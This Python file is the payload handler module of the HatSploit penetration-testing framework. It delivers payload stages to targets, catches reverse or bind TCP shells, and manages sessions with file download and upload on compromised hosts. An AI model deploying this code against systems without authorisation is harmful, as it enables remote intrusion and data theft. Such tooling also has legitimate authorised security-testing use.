#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

import datetime

from pex.post import Post
from pex.post.pull import Pull
from pex.post.push import Push

from pex.tools.post import PostTools
from pex.tools.type import TypeTools

from pex.client.channel import ChannelClient

from hatsploit.core.cli.badges import Badges

from hatsploit.lib.handle import Handle
from hatsploit.lib.blinder import Blinder
from hatsploit.lib.jobs import Jobs
from hatsploit.lib.modules import Modules
from hatsploit.lib.sessions import Sessions
from hatsploit.lib.storage import LocalStorage
from hatsploit.lib.session import Session
from hatsploit.lib.loot import Loot


class HatSploitSession(Session, Loot, Pull, Push, ChannelClient):
    channel = None

    details = {
        'Post': "",
        'Platform': "",
        'Architecture': "",
        'Type': "shell"
    }

    def open(self, client):
        self.channel = self.open_channel(client)

    def close(self):
        self.channel.disconnect()

    def heartbeat(self):
        return not self.channel.terminated

    def send_command(self, command, output=False, decode=True):
        return self.channel.send_command(
            (command + '\n'),
            output,
            decode
        )

    def download(self, remote_file, local_path):
        self.print_process(f"Downloading {remote_file}...")

        data = self.pull(
            platform=self.details['Platform'],
            sender=self.send_command,
            location=remote_file,
            args={
                'decode': False,
                'output': True
            }
        )

        if data:
            return self.save_file(
                location=local_path,
                data=data,
                filename=remote_file
            )

        return None

    def upload(self, local_file, remote_path):
        self.print_process(f"Uploading {local_file}...")
        data = self.get_file(local_file)

        if data:
            remote_path = self.push(
                platform=self.details['Platform'],
                sender=self.send_command,
                data=data,
                location=remote_path,
                method=self.details['Post']
            )

            self.print_success(f"Saved to {remote_path}!")
            return remote_path

        return None

    def interact(self):
        if not self.channel.interact():
            if not self.heartbeat():
                self.print_warning("Connection terminated.")
            else:
                self.print_error("Failed to interact with session!")


class Handler:
    blinder = Blinder()
    post = Post()
    post_tools = PostTools()
    server_handle = Handle()

    sessions = Sessions()
    modules = Modules()
    jobs = Jobs()
    types = TypeTools()
    badges = Badges()
    local_storage = LocalStorage()

    def do_job(self, payload_type, target, args):
        if payload_type == 'one_side':
            target(*args)
        else:
            self.jobs.create_job(
                None,
                None,
                target,
                args,
                True
            )

    def ensure_linemax(self, payload, linemax):
        min_size = 10000
        max_size = 100000

        if len(payload) >= max_size and linemax not in range(min_size, max_size):
            self.badges.print_process(f"Ensuring payload size ({str(len(payload))} bytes)...")
            linemax = max_size

        return linemax

    def send(self, sender, payload, args={}):
        if isinstance(payload, bytes):
            self.badges.print_process(f"Sending payload stage ({str(len(payload))} bytes)...")
        else:
            self.badges.print_process("Sending command payload stage...")

        self.post_tools.post_command(sender, payload, args)

    def open_session(self, host, port, session_platform, session_architecture, session_type, session, action=None):
        session_id = self.sessions.add_session(session_platform, session_architecture, session_type,
                                               host, port, session)
        time = datetime.datetime.now().astimezone().strftime("%Y-%m-%d %H:%M:%S %Z")

        self.badges.print_success(f"{session_type.title()} session {str(session_id)} opened at {time}!")

        if action:
            action()

        if self.local_storage.get("auto_interaction"):
            self.sessions.interact_with_session(session_id)

    def module_handle(self, host=None, sender=None, args={}, concat=None, location=None,
                      background=None, method=None, timeout=None, linemax=100, ensure=False,
                      on_session=None):
        module = self.modules.get_current_module_object()
        rhost = host

        options = module.handler
        payload = module.payload

        if 'BLINDER' in options:
            if options['BLINDER'].lower() in ['yes', 'y']:
                if sender is not None:
                    self.handle(
                        sender=sender,
                        args=args,
                        blinder=True
                    )

                    return True

        stage = payload['Payload'] if method != 'raw' else payload['Raw']

        if payload['Details']['Type'] == 'bind_tcp':
            host = options['RBHOST']
            port = options['RBPORT']

        elif payload['Details']['Type'] == 'reverse_tcp':
            host = options['LHOST']
            port = options['LPORT']

        else:
            host, port = None, None

        if 'Session' in payload['Details']:
            session = payload['Details']['Session']
        else:
            session = None

        if 'Arguments' in payload['Details']:
            arguments = payload['Details']['Arguments']
        else:
            arguments = None

        platform = payload['Details']['Platform']
        architecture = payload['Details']['Architecture']

        if platform in self.types.platforms:
            module_platform = module.details['Platform']

            if module_platform not in self.types.platforms:
                platform = module_platform

        return self.handle(
            payload=stage,
            sender=sender,

            host=host,
            port=port,

            rhost=rhost,

            payload_category=payload['Details']['Category'],
            payload_type=payload['Details']['Type'],

            args=args,
            concat=concat,
            location=location,
            background=background,

            method=method,
            timeout=timeout,
            linemax=linemax,

            platform=platform,
            architecture=architecture,

            ensure=ensure,
            blinder=False,

            session=session,
            arguments=arguments,
            on_session=on_session
        )

    def handle(self, payload=None, sender=None, host=None, port=None, rhost=None, payload_category='stager',
               payload_type='one_side', args={}, concat=None, location=None, background=None,
               method=None, timeout=None, linemax=100, platform='generic', architecture='generic',
               ensure=False, blinder=False, session=None, arguments=None, on_session=None):

        if blinder:
            self.blinder.shell(sender, args)
            return True

        if not self.send_payload(
            payload=payload,
            sender=sender,

            payload_category=payload_category,
            payload_type=payload_type,

            args=args,
            concat=concat,
            location=location,
            background=background,

            method=method,
            linemax=linemax,

            platform=platform,
            ensure=ensure,
            arguments=arguments
        ):
            self.badges.print_error("Failed to send payload stage!")
            return False

        remote = self.handle_session(
            host=host,
            port=port,

            payload_type=payload_type,
            session=session,
            timeout=timeout
        )

        if not remote:
            self.badges.print_warning("Payload sent but no session was opened.")
            return True

        session_type = remote[0].details['Type']

        remote[0].details['Post'] = method
        remote[0].details['Platform'] = platform
        remote[0].details['Architecture'] = architecture

        if remote[1] not in ('127.0.0.1', '0.0.0.0'):
            rhost = remote[1]

        self.open_session(rhost, port, platform, architecture, session_type, remote[0], on_session)
        return True

    def module_handle_session(self, payload_type='one_side', session=None, timeout=None):
        module = self.modules.get_current_module_object()

        options = module.handler
        session = session if session is not None else HatSploitSession

        if payload_type == 'reverse_tcp':
            new_session, host = self.server_handle.listen_session(
                options['LHOST'],
                options['LPORT'],
                session, timeout
            )

            if not new_session and not host:
                return None

        elif payload_type == 'bind_tcp':
            host = options['RBHOST']

            new_session = self.server_handle.connect_session(
                options['RBHOST'],
                options['RBPORT'],
                session, timeout
            )

            if not new_session:
                return None

        else:
            return None

        return new_session, host

    def handle_session(self, host=None, port=None, payload_type='one_side', session=None, timeout=None):
        session = session if session is not None else HatSploitSession

        if payload_type == 'reverse_tcp':
            if not host or not port:
                return None

            new_session, host = self.server_handle.listen_session(host, port, session, timeout)

            if not new_session and not host:
                return None

        elif payload_type == 'bind_tcp':
            if not host or not port:
                return None

            new_session = self.server_handle.connect_session(host, port, session, timeout)

            if not new_session:
                return None

        elif payload_type == 'one_side':
            return None

        else:
            self.badges.print_error("Invalid payload type!")
            return None

        return new_session, host

    def send_payload(self, payload=None, sender=None, payload_category='stager', payload_type='one_side',
                     args={}, concat=None, location=None, background=None, method=None, linemax=100,
                     platform='generic', ensure=False, arguments=None):
        if payload is None:
            self.badges.print_error("Payload stage is not found!")
            return False

        if sender is None:
            self.badges.print_error("No sender found!")
            return False

        if ensure:
            linemax = self.ensure_linemax(payload['Payload'], linemax)

        if payload_category == 'stager':
            self.badges.print_process(f"Sending payload stage ({str(len(payload))} bytes)...")

            if method != 'raw':
                self.do_job(
                    payload_type,
                    self.post.post,
                    [
                        platform,
                        sender,
                        payload,
                        args,
                        arguments,
                        method,
                        location,
                        concat,
                        background,
                        linemax
                    ]
                )

                return True

        if payload_category == 'singler' or method == 'raw':
            self.do_job(
                payload_type,
                self.send,
                [
                    sender,
                    payload,
                    args
                ]
            )

        else:
            self.badges.print_error("Invalid payload category!")
            return False

        return True
